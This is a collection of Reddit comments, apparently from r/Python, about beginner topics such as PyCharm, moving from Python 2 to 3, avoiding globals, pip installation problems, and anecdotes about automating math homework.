Whenever I take over a repo in any language at work, I spend a solid 30-60 minutes correcting all the spelling. I guess I’m just persnickety that way. 
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
This occurs in C, C++, Scheme (more often than not), D, and more. I've even seen it happen in Java twice on some small tree-like datasets. The answer is always it depends in regard to if iteration is faster than recursion. Sometimes fetching data from the heap costs more than pushing another layer of function calls to the stack. Assuming the best possible solutions to a problem, in a *perfect world*, iteration would always win, and in a purely mathematical one, iteration would either win or tie with recursion. But in our real world of varying factors ranging from language specifications to compiler optimization implementations to memory allocation and fetch implementation to the hardware configuration to the temperature in the damned room affecting your hardware, it is indeed possible for recursion to consistently be better than iteration.
This is is exactly how I started programming (in a weird old language called Turing) writing programs to do my matrix math homework for me. Eventually I wrote a symbolic differentiation program in Lisp to do my calculus homework. Keep it up!
Based on the file paths visible in the pic, looks to be pycharm.
You *can* program an Arduino Uno in Python with the Firmata protocol, at least. Though I think it will have to run through a laptop or desktop. But I'd recommend the Raspberry Pi if you're completely new to programming and deploying code on microcontrollers. If you're looking at tinier chips, try the ESP8266, aka the Nodemcu. You can flash Circuitpython or Micropython on it, and get started with it. 
In Linux Tkinter works in some specific desktop environments, for example GNOME but in KDE doesn't work. So maybe it has to be with the desktop environment of Mac, I would recommend you to use another library to make GUI's.
[https://xkcd.com/927/](https://xkcd.com/927/) This sums up Python Environment Managers perfectly unfortunately.
Seems like all the Python to C compilers just get tripped up on anything but simple code. Like if you use lambas or scikit there's a good chance it won't work. That was my experience anyway.
Damn, came here to give the same story. It was in my Algebra II class. We we're doing polynomial expansion, and I wrote a program that would not only solve it, but show the work for it too. Teacher said if I was able to write a program that actually showed the work and didn't just spit out the answer, I clearly knew the material very well and was allowed to use the program on the test on the condition that I didn't share the program with other students.
PyCharm.
Go back to Java.
Python 2 is going end of life pretty soon. If you are going to specialize in python it is better to only use python 3. Python 2 will teach you the basics of coding but won't be developed in the enterprise world once it goes end of life
Haha, I actually programmed a random group assigner for my calculus teacher for her TI 89. And for math problems, I generally had the program output intermediate step answers so an answer didn't appear out of nowhere on my sheet, but had steps towards it.
The security concerns are mostly bunk. "Bytecode dumping and injection" are only issues if you're running untrusted code. In a reasonable environment where you're not using "eval" and you're running in a standard environment where you can't write over the standard imports, there's very little to worry about. &amp;#x200B; Sure, an attacker might find a vulnerability in a C library used by Python and use that to change what code is executed, but once you go there, the attacker could probably run just about anything. The vulnerability will still exist in a recompiled instance.
Heh that's where I started, too. Algebra II and Trig. Computers did the majority of my trig homework. I hated trig.. never got along with the teacher either.. I remember one day he was being smart, it must have been 10/01/2010 or something like that, because he wrote "42" on the board and was acting all smart when he was confusing the class, and I raised my hand and was like "Isn't it 38?" And that's when I realized everyone in my class hated me.
pycharm
Eh, don't underestimate text-based games, though it does depend on what you mean by that. [Cataclysm DDA](https://github.com/CleverRaven/Cataclysm-DDA) has a ridiculously in depth crafting system that has taken years of refinement and will take years more as they add new features to the game. However, you should figure out the broad scope of your game first before diving into details like a crafting system. Have a design of the entire experience and how a crafting system helps contribute towards it. A crafting system for idle games is going to be different than action RPGs. A lot of programming starts with pen and paper designs and then finer implementation details come later.
How do you assign wights to variables when calculating probability?
Which editor is this?
Took me a while to see it as well!
If you're using pycharm, should be able to refactor it with ease
Good job, /u/spiller10156 ! It's awesome to see the progress you're making! Codecademy is one of many great places on the internet to get going with Python. Python can be a really useful tool for fun and potentially professionally! There are a few really awesome things you can do right now to make your code a little easier to work with, which aren't too hard at all! I hope it's OK with you: I [refactored](https://pastebin.com/tmEd5mXQ) your code to show you some of these things--mostly argument passing--and put in some comments about things you can google around to learn more about (like differences between Python 2 and 3, the \_\_name\_\_ block, and argument unpacking). Let me know if anything doesn't make sense, happy to help! Python is a pretty welcoming community, both on Reddit and in general. Welcome! :)
it says pycharm in the screenshot :)
I’d classify that as stability, not security (except for the anti-tinkering, which typically doesn’t involve Python anyway). Both are important, but they’re different animals.
Totally agree. Remember when print was not a function? To this day I still forget the parentheses every once in a while. 
please upgrade to python 3.x
If you want 2D there is no reason to use PyOpenGL you won't really have any 2D support in it. SDL is smart enough to accelerate your 2D canvas with GPU under the hood if you specify correct flags and your hardware/OS supports it. All in all, go with PyGame imho.
What GUI is that?
Great job! Choosing PyCharm was definitely a good choice! Now there are a few things I'd like to point out. First of all, as others have mentioned, try to make a switch to 3.x (preferably 3.6 or 3.7) as soon as possible. There is by no means anything wrong with using 2.x by itself, but it will be deprecated soon enough. There are not much differences between the two, so it's not that difficult to make the jump, but enough to break backwards compatibility. Another thing I would point out is function arguments. It is a good practice to avoid globals, except when needed (for example magic constants and stuff). Now you already showed a trait of a good programmer, but look into docstrings. They make it easier for you (and others)bto know to which function you are commenting, and if written correctly, you'll also let PyCharm know what the function is about and how it works so it'll be able to offer you even more help in the form of autocompletition and simmilar. I see you are already using venv, which is awesome! Now I don't know whether you know it already or not, but if you don't, definitely go try and learn Git. Basic commands and workflow are generally not that hard to understand, but once you know it, it's a real life-saver. If you don't understand something I wrote, need further explanation, or just want some help, feel free to contact me further, I'd gladly help.
See, I knew that at the time of writing the post, but figured it'd still be a good idea to run it by Reddit, while also ensuring that it was the best tool for the job and there wasn't any other one that was wayyyyyy better or designed for simulations directly Thanks! 
They are based on Search engines data and probably about half of the points vb.net got this month for those are mine 😂. Working so much on excel lately
Lol exactly, or if you’re tracking that file with git and you’re too lazy to go through the extra step to rename the file with git
And IPython
Great refactoring right here! I really like the idea of a single function that calls the other two, much easier to pass the arguments that way by reducing a step or two. 
Unfortunately, R is still ahead in many scientific areas. R sucks as a language, but the ecosystem is incredible. A lot of packages are written and maintained by actual scientists, documentation is very good and contain references. For example, if I have to do anything related to time series, I have to do it in R...
Yes, "new" and "Python 2.7" don't match...
I mistyped it every damn time. 
&gt; "The way I figure it, if you can teach a machine to do it for you then you must understand it pretty well." This is beautiful.
I downloaded the correct setup file. The setup wanted to download into the wrong drive, so I changed it to the one I wanted to. But I don't think it had the correct files or something like that. The message from the setup that popped up before the BSOD said something like "no help file located", I clicked "cancel", thinking it would just stop the install, but then things went downhill.
Full credit!
Why not install Anaconda? It has everything that you want, and much more. If you install the latest version, you will automatically have IPython 3.6.6. I very much agree on not using globals, but function arguments. Also, if you make the step to function arguments, start using type hints right away. You will thank yourself later. Next come classes, decorators and multi-threading apps and tadaa, your learning curve went up exponentially.
It really depends on your algorithm. Put simply, convert your mathematical algorithm to a python function. 
Hehe. Same here. But I had the Ti-82 (still have it somewhere). It was super convenient to have at tests, so I could double check all my work. Still had to show my work, but my program would prevent me from doing stupid mistakes. 
ok
Thank u I did not know r/learn python was a thing
By the way, pyopengl is not 'extremely slow'. In a modern OpenGL app, it's quite fine to do much of the work on the GPU. Lots of fine apps have been made with pyopengl that run really fast, and do lots of stuff. I write code in C++, C, and python using OpenGL professionally. And the OpenGL part is almost never the bottleneck with pyopengl.
Have to do an assignment for my Computer Class that involves making math functions run in Python. I'm frustrated in an oddly satisfied way.
 A Python dictionary is a sequence of key/value or item pairs separated by commas. we can make a discussion and clear of python here it was good [https://www.learntek.org/blog/python-dictionary/](https://www.learntek.org/blog/python-dictionary/)
Nice. I relearned PERL to hack my Linear Algebra online homework assignments... Don't forget to actually learn!
But what if he's a data scientist? /s
That's not how anything works...
I am not associated with this project, but it looks like nice combination of click and python-prompt-toolkit both off them I was using and liked them a lot.
You don't have to activate, I use python3 -m venv and never use the de/activate stuff. All my projects have a makefile anyways so I just write the command once in there and type make thereafter. Same goes for the pycharm set-up, point it once to the venv and done. 
&gt; And that's why "easy" dependency management is a 100% non-starter for me. I'm not making each of my users understand every single one of these "easy" installation systems to get all my multi-language dependencies installed. It's all statically linked. All you hand to the user is the compiled binary. That's the point, nobody has to understand anything because the work is done by the build system before the user ever sees it.
Feels good to make it work, right? Next steps for your script if you want to improve your Python: \- read a csv file with all the point's coordinates instead of raw\_input \- make it Object Oriented (no need at all, but nice exercise) \- make a small GUI around it \- make a plot of your data \- implement Image recognition to make your script read coordinates from human gestures ( ... /s )
I don't understand the -17 downvote in this post, this guy has a point.
Use Python 3.7 my dude. It's immeasurably better. 
Pip is included but it’s not in your PATH variable so if you type it in the shell can’t find it. These instructions may help - they are generic to Windows and not specific to anything to do with raspberry pi :) https://projects.raspberrypi.org/en/projects/using-pip-on-windows
Working on a little script that can manage encoding my music library for me. I have a mixed library, containing both MP3s and lossless FLAC files, but I don't want FLACs on my mobile devices because of the space requirements. So my script automatically creates an all-MP3 mirror of my library that I can easily copy to my phone and notebook. It can also track the library between runs using a minimal (and very shitty) sqlite3 database. It's far form pretty, but it works reasonably well for my needs. 
I'd be really interested in doing that as well. Managing time for different projects with different billing codes is getting to be a pain in the ass for me. 
And jupyter notebook
&gt;Logan WAAAAAAAAAAAAAALMAAAAAAAAAAAAAAAART
There is no pip at all. If I look for pip.exe I get one result a 2.7 pip, that is installed with Unreal engine. If I look for pip.exe on my laptop then it does show up in scripts.
All I did was make a cricket game on my graphics calculator lol. It helped pass the time in boring maths class
Oh my sweet summer child. "Security" doesn't mean being secure. "Security" means meeting an arbitrary bulleted checklist. They don't care if Python 3 is more secure than Python 2. They care that they took 18 months to get a new machine on the network. If they did, they must be secure.
Great job refactoring that code. My ten cents u/spiller10156, refactoring your own code by applying concepts that you learn everyday is a very powerful tool to improve your coding IMO. Great job and keep automating math homework. 
I wouldn't recommend notebooks to people new to coding.
The downvoters didn't get it. (or they were sad and angry py2 data scientists)
Why 3.7 vs 3.6?
Note that f-strings were added in 3.6, another reason to upgrade :)
Actually I'm having trouble naming any scientific programming that doesn't use linear algebra, good point! But its possible to avoid matrix operations (that Matlab is easy for) if you write iterative rather than direct system solvers. I guess I meant, "Albeit the matrix operations in matlab are 10 times easier"
Serious question. Why wouldn't you? I learned python with notebooks and it is so full of possibilities.
It is definitely worth it. In my practical experience, I found it to be better than both TextRank and TF-IDF, especially when you want to find out n-grams or phrase extraction, rather than just words 
Relatively new here. Why Python IDE is this? Visual Studio? And does it work with python version 3.x?
Because 3.6 is older. Why learn the older version with less useful features?
Why use it? Because I know it and it works well for me at present. 
I’m a python newbie. I’ve been using 3.6. If I switch to 3.7 will I need to make many changes to my code?
Please no numpy 
No, you won't need to make any changes unless you've been doing things that you really shouldn't have never been doing in first place. The only time that *might* happen is when the major version changes (e.g python 3 to python 4). In general you should try to stay up to date with version. You can see the 3.7 changelog [here](https://docs.python.org/3/whatsnew/3.7.html).
He meant Python 3 as opposed to 2 I believe. Breaking changes between them, different syntax, most (myself included) prefer 3. Correct me if I'm wrong OP
This should be the top post! Well done, I think a matplotlib expansion would be appreciated too ! &amp;#x200B;
From the sidebar. If you are about to ask a "how do I do this in python" question, please try r/learnpython or the Python discord.
Others already told you that it's pyCharm... But furthermore you can also your your hands on it for free with an educational license (you just need a educational institution email).

Thanks for this. I read through that changelog and my code is too basic to be affected. And also wow I have a lot to learn!!!
Thanks for the reply! If I understand PyXB correctly, I'm not sure if it's the tool I need. I already have a Python class containing the data fetched from the database, but need to convert that data to XML format. I see I wasn't very clear on this in the post above, so I decided to create a new post where I outline the details a bit further: [https://www.reddit.com/r/learnpython/comments/9dsso5/whats\_the\_best\_way\_of\_transforming\_sql\_query\_data/](https://www.reddit.com/r/learnpython/comments/9dsso5/whats_the_best_way_of_transforming_sql_query_data/) &amp;#x200B; Please feel free to read and comment on that post instead. 
[Why](https://towardsdatascience.com/5-reasons-why-jupyter-notebooks-suck-4dc201e27086)
My teacher was the same way. Made a program with something like 8 different functions on it. He was nothing but impressed. RIP Mr. Adams
I run a fairly popular open-source LED project, and we feel obliged to keep backwards compatibility with Python 3.4, though within the year we'll be losing it. In particular, Ubuntu 14.04LTS (Trusty) is still common and still comes with Python 3.4. That's going to end-of-life [next April](https://wiki.ubuntu.com/Releases). 
Where did you install Python from? If windows, pip is installed by default. I suspect there's some confusion between the different interpreters you have. Try `python3 -m pip` which will use the pip linked to the interpreter. People need to update their docs; the method above is the "correct" way to invoke pip now, because of basically exactly this problem.
&gt; and ton of people still use python 2 for some reason. You can't expect people to do new development on Python 2.
It's the first step in allowing the functions to be imported into another script without executing the rest of the code. 
PyCharm
I used to do this with my math courses too! I found learning the quadratic formula was easier in Python!
I dont, im just saying that it does happen unfortunately.
Sorry for nitpicking.. But your file name is incorrectly spelled
Yes, that has been noticed quite a bit...
Has jupyter lab done anything to address those complaints?
How do I learn? Codeacademy taught me 2.7.
That remeber me somes memories. :) 
Python programmers can pack pages of puzzlingly paraphrased pizzazz (parenthetically pythonized) into a plethora of packaged pieces at a phenomenal pace. To put progress in perspective, however, the pot of possible p-words is prodigious.
I love how you’ve just started Python and created something to complete your homework, meanwhile I’m over here in my universe of Hello World and How to write an if statement. God I’m slow.
Nice writeup, thank you for sharing. Take a look at [old Kaggle competition](https://www.kaggle.com/c/spooky-author-identification) might get some more cues from Kernel/Discussion section. You might also want to read-up on [Forensics Linguistics](https://en.wikipedia.org/wiki/Forensic_linguistics). On the other hand I am a bit skeptical about using Tf-IDFs score, what about N-grams. Words are fine but if you factor in the Sequence of Words it might start making sense. Plus I think it might be tricky because some of these accounts are managed by assistants/interns, where as the original message might be from the official. What might be interesting to do is: 1. Add more analysis/algorithms to the mix 1. Add more data {Transcripts from press-release}
What coding environment are you using?
Ditch python and just use Nim.
You’re probably doing a valuable service, you’re also probably a real programmer whereas I’m just a dude who likes to automate his job and pretend I’m not browsing Reddit while the scripts run. Nobody’s taking over my codebase.
Sounds interesting. How is progress on it?
Nothing much to learn. Read reference fto know basic grammar and when you get an error ask to Google or Stackoverflow :)
Or connect microcontroller board to you existing computer without the need of working on a small ARM PC.

I've used beautiful soup to scrape league data from a website. It's very tricky to use and get the information you need if you're not familiar with the module, but it's very powerful. I've also used json so that I can export my data to a flexible format and import it rather than have to rescrape data everytime the app runs. I had some issues fully understanding scope of the dictionary but I have it working now. I put the league info into a dictionary so if I want to compare goal difference for example, I can do something like: print("difference =" + str(leagueData["Prem" ] ["Manchester United" ] [Home] [Gd] - leagueData["Prem" ] ["Manchester City" ] [Away] [Gd])) In such a case positive number would favour the home team a negative number would favour the away team. I need to write a process that provides a good comparison of two teams. From there I want to scrape fixtures so that I can automatically compare for all games. Then I'd want to scrape results and run some auto tests to see what techniques are most effective. A lot to do! So I'm sure I'll run into some issues, but it's all fun

You need to bind to real IP address that other devices can see. ``` application.listen(9000, '&lt;your ip address here&gt;') ``` If you don't supply IP address default '127.0.0.1' will be used and that means that only programs from the local machine can access server. I'm not 100% sure but if you supply '0.0.0.0' as IP address it should mean bind to all IP addresses of the current machine. Vitalije
First things first: I don't know of such a tool. The rest is just my opinion on the approach, so don't read it if you are not interested. All that sounds a bit dysfunctional to me. Why are you not updating your server to 3.6 when you are developing in Python 3.6. Or install 3.6 in a separate environment for that application? Also, if 3.6 is not an option on the server and you are forced to run on 3.4, why do you wish to continue developing on 3.6 instead of migrating down to 3.4 once and then staying there? Using an automated tool to convert all the code to a different version seems like a sure way to run into issues at some time if you don't want to hand-check all the changes made by that tool every time you do a release.
you didn't change any settings in the installer?
Great work! Several people recommended not using global variables, but didn't explain how. Here's an example using a dictionary that we can pass between your functions. Note: This is Python 3 ''' import math def get_values(): """Prompts User for 4 values and returns a dictionary of values""" values = {} # This 'values' dictionary only lives inside this function until we return it. point1x = float(input("Point 1 X-Value: ")) values['point1x'] = point1x # add the key value to the values dictionary point1y = float(input("Point 1 Y-Value: ")) values['point1y'] = point1y point2x = float(input("Point 2 X-Value: ")) values['point2x'] = point2x point2y = float(input("Point 2 Y-Value: ")) values['point2y'] = point2y return values def line_midpoint(values): """demonstrating using the values dictionary""" x_value = (values['point1x'] + values['point2x']) / 2 return x_value if __name__ == "__main__": """This makes it so the code below runs when you do python math_example.py""" values = get_values() # We have to create the values Dictionary to pass to the next function. print(line_midpoint(values)) '''
I think the biggest difference in beginner use is that you should use `print(‘string’)` instead of `print ‘string’` Also maybe that you don’t need to use `xrange()` any more, and can just use `range()` Definitely upgrade to 3.x, 2.7 is very outdated. Check out [learnpython.org](www.learnpython.org) for beginner python3 tutorials :)
As many others in this thread, I did the same. Love it.
Thanks! I will check out this book.
Fantastic idea!
Yeah, I know. We develop the software for a company, that deal with very sensible data. The server we got from them, has a secure LTS Enterprise Linux, which doesn't support Python 3.4 via the official repositories. Also we have very limited internet access. Getting all the pip packages to run was already quite a pain. And once they hock up the sensible data, we will not even have `sudo` privileges any more. Your are probably right, developing the software in Python 3.4 will be the best option.
Very creative
 I'd be very surprised if the 3.7 installer was busted - if v3.6 works I would check your system first before logging an issue with the installer.
In addition to what others have said, quite a few can read and inject network traffic and don't need to hook the application binaries. 
&gt; I write code in C++, C, and python using OpenGL professionally. And the OpenGL part is almost never the bottleneck with pyopengl. This is usually true, I'll give you that.
This is far more interesting than i expected when I asked. Would it be possible to follow your work on this? EPL is exactly what i want to look at (live just outside Manchester actually) i want to get familiar with data analysis and probability football seems like a decent way to as there are so many different aspects you can follow. Do you have a GitHub page or can you form something on discord?

Something stops pip from installing. Its really weird.
I wouldn’t say there is any connection between standard arduiono scripting and c++. Just look up an arduino tutorial, it’s so simple and beginner friendly.
This is exactly what got me into programming around 15 years ago. Learned early on that doing math problems was horribly inefficient so I began writing tools to do the work for me. My language of choice at the time was Perl, eventually moved to Python. &amp;#x200B; One piece of advice for you... keep doing exactly what you're doing.
I thinks something is or 1 screwed up with my system. Or 2 the installer is broken 3.6 worked first try. Really strange. Thank you for your help.
JetBrains' entire software suite makes my life so much easier and more enjoyable. Being able to refactor a file name change across like 100 files in &lt;5 seconds is pretty awesome.
&gt; Anaconda Anaconda is a distribution that is probably great for data scientists. However Pycharm and venv will handle the package management and python versions. I think learning basic python + pip is better if you want to be a python developer. I think this is why you got down-voted. I also learned on a Commodore 64! Really great memories.
You're aware of the built in ABC and are asking what's the pythonic way? How about the one that's built in? It's not clear your stuff is complicated enough to worry about ABC so just sibclass for now 
What up, your teacher hates open source?
Damn I just started taking algebra II, gonna start making some python calculators now!
&gt; "The way I figure it, if you can teach a machine to do it for you then you must understand it pretty well." EXACTLY THE SAME! I had so many programs. I even had one that printed out the quadratic formula on the screen because it was an extra credit question on every test (in addition to solving for whatever you needed). Good times. Sad to know they're all gone now, but that calculator was my first ever programming project. 
well done, lad
Transcrypt, especially this release, is a very interesting project and I personally find it the most practical Python to Javascript transpiler out there. Other than that, the founder/community's warm response and kinda active development is impressive.
Heh, did the same during a national math competition between all the schools in Norway, solved 36 thousand tasks within a night just by having it run on my computer. Wrote it in JavaScript and saved it in a bookmark, had an auto clicker automatically click it so it would solve all the tasks. Sadly didn't win anything as nobody else on our school did anything, but was a fun challenge.
IIRC, it is possible to skip the pip setup in the installer. The docs seem to indicate the same: https://docs.python.org/3/library/ensurepip.html. If you could reinstall with logging it may help troubleshoot. Otherwise, you can use this to install the version of pip that came with Python: python -m ensurepip Add --upgrade to download the latest instead: python -m ensurepip --upgrade I agree it shouldn't be necessary, but at least there is a built-in fix now...
Your percipient proclamation is prescient in it's prognostication of the propagation of p-words in perpetuity. I am pained in pondering the pusilanimity of such a ponderous predisposition amongst our peers. Also I claim pydigious...
